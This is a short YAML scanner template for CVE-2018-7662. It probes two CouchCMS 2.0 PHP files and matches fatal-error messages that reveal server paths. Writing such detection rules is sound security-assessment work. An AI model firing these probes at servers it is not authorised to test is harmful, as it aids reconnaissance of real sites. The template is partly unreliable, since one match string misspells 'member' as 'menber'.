id: CVE-2018-7662

info:
    name: Couchcms 2.0 Dictionary Disclosure
    author: we1x4n(https://we1x4n.github.io/)
    severity: medium

rules:
    r0:
        request:
            method: GET
            path: /includes/mysql2i/mysql2i.func.php
        expression: 'response.status == 200 && response.body.bcontains(b"mysql2i.func.php on line 10") && response.body.bcontains(b"Fatal error: Cannot redeclare mysql_affected_rows() in")'
    r1:
        request:
            method: GET
            path: /addons/phpmailer/phpmailer.php
        expression: 'response.status == 200 && response.body.bcontains(b"phpmailer.php on line 10") && response.body.bcontains(b"Fatal error: Call to a menber function add_event_listener() on a non-object in")'
expression: r0() && r1()

